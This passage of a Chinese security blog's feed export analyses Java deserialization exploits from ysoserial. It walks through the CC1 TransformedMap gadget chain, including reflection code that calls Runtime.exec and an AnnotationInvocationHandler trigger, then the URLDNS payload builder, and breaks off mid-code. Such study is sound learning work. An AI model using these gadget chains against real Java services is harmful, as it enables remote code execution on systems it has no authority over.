class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//获得一个Class对象</span></span><br><span class="line">Class aClass = Runtime.class.getClass();</span><br><span class="line"><span class="comment">//这里的getMethod是为了和下文的 aClass1 打配合</span></span><br><span class="line">Method getMethod = aClass.getMethod(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;);</span><br><span class="line">Object getRuntime = getMethod.invoke(Runtime.class, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//以上三行操作相当于:</span></span><br><span class="line"><span class="comment">//Method getRuntime1 = Runtime.class.getMethod(&quot;getRuntime&quot;);</span></span><br><span class="line">System.out.println(getRuntime); <span class="comment">//public static java.lang.Runtime java.lang.Runtime.getRuntime()</span></span><br><span class="line">System.out.println(getRuntime.getClass()); <span class="comment">//class java.lang.reflect.Method</span></span><br><span class="line"> </span><br><span class="line">Class aClass1 = getRuntime.getClass();</span><br><span class="line">Method invoke = aClass1.getMethod(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;);</span><br><span class="line">Object invoke1 = invoke.invoke(getRuntime, <span class="keyword">new</span> Object[]&#123;Runtime.class, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;);</span><br><span class="line"><span class="comment">//以上三行操作相当于:</span></span><br><span class="line"><span class="comment">//Object invoke3 = getRuntime.invoke(Runtime.class);</span></span><br><span class="line">System.out.println(invoke1); <span class="comment">//java.lang.Runtime@14ae5a5</span></span><br><span class="line">System.out.println(invoke1.getClass()); <span class="comment">//class java.lang.Runtime</span></span><br><span class="line"></span><br><span class="line">Class aClass2 = invoke1.getClass();</span><br><span class="line">Method exec = aClass2.getMethod(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;);</span><br><span class="line">Object invoke2 = exec.invoke(invoke1, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;xcalc&quot;</span>&#125;);</span><br></pre></td></tr></table></figure><p>至此gadgets就分析完了，接下来开始寻找能够跳到 TransformedMap触发点 的反序列化入口点了。</p><br><h1 id="readObject-AnnotationInvocationHandler"><a href="#readObject-AnnotationInvocationHandler" class="headerlink" title="readObject() - AnnotationInvocationHandler"></a>readObject() - AnnotationInvocationHandler</h1><p>gadgets这一节最后说，我们需要寻找调用入口点，找到能够调用 <code>TransformedMap</code>类方法的点。</p><p>根据Poc发现其序列化了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>类，并将 gadgets中最后一行经过 <code>TransformedMap.decorate()</code> 修饰的 <code>Map outerMap</code> 传入其构造方法中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object o = declaredConstructor.newInstance(Retention.class, outerMap);</span><br><span class="line">....<span class="comment">//对 o 进行序列化和反序列化操作</span></span><br></pre></td></tr></table></figure><p>这个漏洞是一个反序列化漏洞，所以我们应当去瞄瞄 AnnotationInvocationHandler类的 <code>readObject()</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sun.reflect.annotation;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line">    </span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">        Class[] var3 = var1.getInterfaces();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">            <span class="keyword">this</span>.type = var1;</span><br><span class="line">            <span class="keyword">this</span>.memberValues = var2;</span><br><span class="line">        &#125;</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        AnnotationType var2 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"></span><br><span class="line">        Map var3 = var2.memberTypes();</span><br><span class="line">        Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">            Entry var5 = (Entry)var4.next();</span><br><span class="line">            String var6 = (String)var5.getKey();</span><br><span class="line">            Class var7 = (Class)var3.get(var6);</span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                Object var8 = var5.getValue();</span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//调用了setValue()。 </span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该<code>readObject()</code> 的流程，可分为两个并行分支：</p><ol><li>调用到 TransformedMap 的代码 <code>setValue()</code>，他是如何调用到 TransformedMap 的？</li><li>进入 <code>setValue()</code>之前有一判断 <code>if (var7 != null)</code>，如何确保一定能进入这个分支？</li></ol><br><h2 id="如何调用到TransformedMap"><a href="#如何调用到TransformedMap" class="headerlink" title="如何调用到TransformedMap"></a>如何调用到TransformedMap</h2><p>我们发现 <code>readObject()</code>方法 中和 <code>setValue()</code> 相关的类成员是 Map类型的<code>memberValues</code>。而Poc强制实例化 AnnotationInvocationHandler类 时就将 <code>memberValues</code> 设置为 TransformedMap类型的 <code>outerMap</code>了。所以 AnnotationInvocationHandler类 中对 var4、var5 的操作我们去到 TransformedMap类去看源码和调试即可。</p><p>TransformedMap 关系图如下（红圆点是关键类）：</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/2.png" width="600px"><p>经过调试和代码追踪可了解到触发流程：</p><img src="/2021/05/19/2021-05-19-ysoserial-extra-cc1-transformedmap/3.png" width="1000px"><br><h2 id="如何进入if判断"><a href="#如何进入if判断" class="headerlink" title="如何进入if判断"></a>如何进入if判断</h2><p>进入 if判断 的代码中，有几个重要的变量。具体这些变量是如何被赋值的就不详细写出来了，自行跟进一下代码就能知道。我也不想把一堆篇幅写在跟着代码跳来跳去上。这里仅说思路和流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Poc中，一些类成员已经被赋值：</span></span><br><span class="line"><span class="comment">//this.memberValues 为 TransformerMap</span></span><br><span class="line"><span class="comment">//this.type 为 Retention.class</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//这里是注解的操作</span></span><br><span class="line">AnnotationType var2 = AnnotationType.getInstance(<span class="keyword">this</span>.type);</span><br><span class="line"><span class="comment">//获取注解中 所有方法 及其 返回值 的Map</span></span><br><span class="line">Map var3 = var2.memberTypes();</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取TransformerMap iterator</span></span><br><span class="line">Iterator var4 = <span class="keyword">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Entry var5 = (Entry)var4.next();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//获取 TransformerMap 的key</span></span><br><span class="line">    String var6 = (String)var5.getKey();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//查看Retention是否有方法名为var6的方法</span></span><br><span class="line">    <span class="comment">//Retention注解只有一个方法：RetentionPolicy value()</span></span><br><span class="line">    <span class="comment">//所以var6必须为 &quot;value&quot; 才能顺利获得 var7</span></span><br><span class="line">    Class var7 = (Class)var3.get(var6);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="keyword">null</span>) &#123;</span><br><span class="line">        Object var8 = var5.getValue();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//只要TransformerMap的value不是RetentionPolicy类型就没有问题</span></span><br><span class="line">        <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">            var5.setValue(.....);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下这一节，其实这个if判断的思想是：只有Map的key值和注解的方法名一致，才会调用 <code>setValue()</code>。</p><br><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>CC1 TransformedMap 链的核心思路如下：</p><ol><li><p><code>InvokerTransformer.transform()</code> 中存在可控的反射操作</p></li><li><p><code>ChainedTransformer.transform()</code> 对 <code>Transformer[]</code> 遍历调用 <code>transform()</code>，为执行多段反射提供了可能</p></li><li><p>执行到 <code>ChainedTransformer.transform()</code> 的入口为:</p><p><code>AbstractInputCheckedMapDecorator.MapEntry.setValue()</code></p></li><li><p>反序列化入口点 为 <code>sun.reflect.annotation.AnnotationInvocationHandler.readObject()</code>，该方法执行了 可控Map类型 类成员的 <code>setValue()</code> 操作</p></li></ol><p>最后提一下，<strong>jdk &gt;= 8u71</strong> 这条链子就失效了。这是因为 AnnotationInvocationHandler类的 <code>readObject()</code> 代码有变化。原本的 <code>setValue()</code> 没了。唯一有点希望的 <code>var7.put(var10, var11)</code> 结果 var7 是个新new的LinkedHashMap，不可控。所以就冇得了。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    GetField var2 = var1.readFields();</span><br><span class="line">    Class var3 = (Class)var2.get(<span class="string">&quot;type&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//var4就是反序列化时的属性 memberValues</span></span><br><span class="line">    Map var4 = (Map)var2.get(<span class="string">&quot;memberValues&quot;</span>, (Object)<span class="keyword">null</span>);</span><br><span class="line">    AnnotationType var5 = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var5 = AnnotationType.getInstance(var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var13) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map var6 = var5.memberTypes();</span><br><span class="line">    <span class="comment">//首先，var7是新new的一个LinkedHashMap()，不可控</span></span><br><span class="line">    LinkedHashMap var7 = <span class="keyword">new</span> LinkedHashMap();</span><br><span class="line"></span><br><span class="line">    String var10;</span><br><span class="line">    Object var11;</span><br><span class="line">    <span class="keyword">for</span>(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) &#123;</span><br><span class="line">        <span class="comment">//其次调用的是 AbstractInputCheckedMapDecorator.MapEntry.next()</span></span><br><span class="line">        Entry var9 = (Entry)var8.next();</span><br><span class="line">        <span class="comment">//可惜这里getKey()并不能触发到 TransformedMap</span></span><br><span class="line">        var10 = (String)var9.getKey();</span><br><span class="line">        var11 = <span class="keyword">null</span>;</span><br><span class="line">        Class var12 = (Class)var6.get(var10);</span><br><span class="line">        <span class="keyword">if</span> (var12 != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//可惜这里getValue()也不能触发到 TransformedMap</span></span><br><span class="line">            var11 = var9.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var12.isInstance(var11) &amp;&amp; !(var11 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var11 = (<span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(var11.getClass() + <span class="string">&quot;[&quot;</span> + var11 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var5.members().get(var10));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><ol><li><a href="https://www.geeksforgeeks.org/java-lang-class-class-java-set-1/">Java Class Object</a></li><li>【代码审计】知识星球 - Java安全漫谈</li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;看完URLDNS之后再看CC链，，这尼玛简直就是一个天一个地。。前前后后大概看了三四天才能勉强说是理解了。然后又花了两天多来写这篇文章。。我感觉我尽力了，，不知道是不是因为我的思维方式还停留在php上，感觉java的文章真是有点难写。。。也许是我太想把每个流程调用都贴出来吧。。后面我会学习下大佬们都是怎么写java文的。。这篇文章就先将就着这样看吧，我尽力了555。。。&lt;/p&gt;</summary>
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/categories/java/ysoserial/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="ysoserial" scheme="http://example.com/tags/ysoserial/"/>
    
    <category term="CC链" scheme="http://example.com/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>ysoserial学习之 - URLDNS</title>
    <link href="http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/"/>
    <id>http://example.com/2021/05/12/2021-05-12-ysoserial-urldns/</id>
    <published>2021-05-12T09:02:12.000Z</published>
    <updated>2021-05-12T09:20:07.507Z</updated>
    
    <content type="html"><![CDATA[<p>大概学了一个多月Java，感觉有点底子了以后，终于开始学习Java相关漏洞了。搓搓手 ==</p><p>开个ysoserial的新坑。。日后慢慢填 = =</p><span id="more"></span><br><h1 id="ysoserial基础使用"><a href="#ysoserial基础使用" class="headerlink" title="ysoserial基础使用"></a>ysoserial基础使用</h1><p>生成POC的地方是 <code>GeneratePayload</code>类的 main 方法。</p><br><p>而调试链子的地方为 <code>PayloadRunner</code>类。每个Payload类都会有一个 main方法，会调用 <code>PayloadRunner</code>类的 run 方法。该方法会将 gadgets 序列化后再反序列化回来。使得我们可以跟进链子。</p><br><h1 id="URLDNS-Poc"><a href="#URLDNS-Poc" class="headerlink" title="URLDNS Poc"></a>URLDNS Poc</h1><p>定位到 ysoserial 的 <code>URLDNS.java</code>。查看 <code>getObject()</code> 方法</p><p>以下注释为ysoserial源码的注释翻译，现在可以不用深入理解，后文会分析为什么。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//为了避免生成Payload时触发到DNS解析，ysoserial 自定了一个 SilentURLStreamHandler 类</span></span><br><span class="line">    <span class="comment">//(具体为什么这样做就能避免，会在后文分析。现在可暂时不管)</span></span><br><span class="line">    URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">    HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">//将要存放URL的HashMap</span></span><br><span class="line">    URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">//作为HashMap key值 的URL</span></span><br><span class="line">    ht.put(u, url); <span class="comment">//触发DNS解析的关键在于key(put的第一个参数)，value无所谓</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行了上面的put()操作，URL的hashCode已经被计算过并存在变量u中</span></span><br><span class="line">    <span class="comment">//但只有调用了 hashCode() 方法才会进行DNS解析</span></span><br><span class="line">    <span class="comment">//所以我们需要手动将其hashCode重置为-1。好让它作为Payload时能够正常调用 hashCode()</span></span><br><span class="line">    Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ht;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ysoserial自定的类。继承 URLStreamHandler</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h1 id="配置IDEA"><a href="#配置IDEA" class="headerlink" title="配置IDEA"></a>配置IDEA</h1><p>环境：JDK1.8</p><br><p>配置 IDEA 的 Run/Debug Configurations：先运行 URLDNS 的 <code>main()</code> 函数使 IDEA Configurations 自动添加对应的配置。此时由于没有设置参数，肯定会报错，不需理会。</p><p>然后再设置 Program arguments 为Dnslog 地址：</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/1.png" width="800px"><p>配置完成后，再运行一次 URLDNS 的 <code>main()</code>，成功触发DNS请求</p><img src="/2021/05/12/2021-05-12-ysoserial-urldns/2.png" width="800px"><br><h1 id="调试反序列化链"><a href="#调试反序列化链" class="headerlink" title="调试反序列化链"></a>调试反序列化链</h1><p>通过查看 ysoserial 的注释可以得知，整个链子如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">* Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>这个注释已经把链子写的很清楚了，这里就不一一跟进分析，仅说明一些关键的点，并解决下初看Poc时的疑惑。</p><p><strong>调试链子</strong>时，我们仅需要在 <code>HashMap.readObject()</code> 方法的 <code>putVal()</code> 操作上打上断点即可调试。</p><br><h2 id="关键点1-最终触发DNS解析的代码"><a href="#关键点1-最终触发DNS解析的代码" class="headerlink" title="关键点1-最终触发DNS解析的代码"></a>关键点1-最终触发DNS解析的代码</h2><p>漏洞点为 <code>URLStreamHandler.hashCode()</code>。关键代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//使用了getHostAddress解析URL</span></span><br><span class="line">    <span class="comment">//该函数会执行DNS请求</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><h2 id="关键点2-为何POC重置hashCode为-1"><a href="#关键点2-为何POC重置hashCode为-1" class="headerlink" title="关键点2-为何POC重置hashCode为-1"></a>关键点2-为何POC重置hashCode为-1</h2><p>gadgets 的最后一个方法为 <code>URL.hashCode()</code>。看一下这个类和方法的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">URL</span> <span class="keyword">implements</span> <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br><span class="line">    .....</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过这一行代码，才会调用到漏洞点</span></span><br><span class="line">        hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以得知，URL类的 hashCode属性 并无 <code>transient</code> 修饰，且若 <code>hashCode()</code> 中 URL类 的 <code>hashCode</code> 值不为 -1 将会直接 <code>return</code>，无法执行到跳板 <code>handler.hashCode(this)</code></p><p>而在Poc的代码中，执行了这样的操作：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashMap ht = <span class="keyword">new</span> HashMap();</span><br><span class="line">URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); <span class="comment">//key为URL类的u</span></span><br></pre></td></tr></table></figure><p>跟进 <code>put()</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap</span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//对key调用了hash()方法</span></span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">------</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> h;</span><br><span class="line">    <span class="comment">//调用了key的hashCode()方法</span></span><br><span class="line"><span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进后可发现，在生成Payload这一步时就会调用URL的 <code>hashCode()</code>，使得这个key值的hashCode属性不为-1。这样的数据被序列化后再反序列化回去时，由于URL hashCode属性不为-1，将无法执行到跳板 <code>handler.hashCode(this)</code></p><p>所以我们需要在 POC中 执行完 <code>Hashmap.put()</code> 后，手动将 hashCode值 还原成-1（用反射是因为hashCode是private修饰的），确保Payload被反序列化后能够正常执行到跳板。</p><br><h2 id="关键点3-自定义了一个继承URLStreamHandler的类"><a href="#关键点3-自定义了一个继承URLStreamHandler的类" class="headerlink" title="关键点3 - 自定义了一个继承URLStreamHandler的类"></a>关键点3 - 自定义了一个继承URLStreamHandler的类</h2><p>跟过链子就知道，最终是 <code>URLStreamHandler</code>类触发的Dns请求。而POC中使用了多态的方式来 new 一个 URLStreamHandler类。为何如此？</p><p>根据注释可知，POC作者不希望在生成POC的时候会执行Dns请求。再根据上文关键点2可知，生成Poc的时候会调用 <code>URL.hashCode()</code>，第一次生成Payload时 <code>URLStreamHandler</code>的 hashCode肯定是-1，铁定会执行到最后的Dns请求代码。</p><p>为了解决这个问题。POC作者使用了多态的方式，自定义继承 <code>URLStreamHandler</code> 的类 <code>SilentURLStreamHandler</code>，并重写其关键方法 <code>getHostAddress()</code>，这样在运行Poc时只会调用到 <code>SilentURLStreamHandler</code>的<code>getHostAddress()</code>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//new 